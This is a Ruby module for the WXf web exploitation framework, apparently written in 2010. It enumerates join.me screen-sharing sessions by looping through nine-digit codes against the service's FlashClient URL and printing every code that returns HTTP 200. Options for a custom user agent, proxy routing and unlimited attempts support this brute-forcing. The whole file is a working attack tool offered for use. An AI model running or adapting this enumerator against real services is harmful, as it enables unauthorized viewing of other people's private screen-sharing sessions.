#!/usr/bin/env ruby
# 
# Created Oct 27 2010
#

class WebXploit < WXf::WXfmod_Factory::Auxiliary

  include WXf::WXfassists::General::MechReq

  
  def initialize
      super(
       'Name'        => 'https://join.me screen enumerator',
       'Version'     => '1.0',
       'Description' => %q{
        Enumerate valid IDs for current running join.me systems
                        },
       'References'  =>
        [
        
        ],
       'Author'      => [ 'KZWERG' ],
       'License'     => WXF_LICENSE
      )
      
      init_opts([
       OptString.new('UA', [true, "Specify a user agent to utilize", "Mozilla"]),
       OptBool.new('START', [true, "Session to Start with 000000000 - 999999999" , "505607262"]),
       OptBool.new('LIMIT', [true, "Total attempts to run (0 for unlimited)" , "2"]),
      ])
      
  end
  

  def run
    
  start = datahash['START']
  limit = datahash['LIMIT']
  rurl = "https://secure.join.me/Client/FlashClient.aspx?flashversion=10.1&code="
  
  i=0
  
  while i<limit.to_i do
    code = sprintf("%09d",start.to_i + i)
    #puts rurl + code
    res = send_request_cgi({
      'method' => 'GET',
      'RURL'   => rurl + code,
      'UA'     => datahash['UA'],
      'PROXY_ADDR' => proxya,
      'PROXY_PORT' => proxyp,
      'REDIRECT'   => 'false'
    })
    i += 1
    if (res) and (res.code == '200')
      puts "Valid ID: #{code}"
    end
  end
  
end



end
  
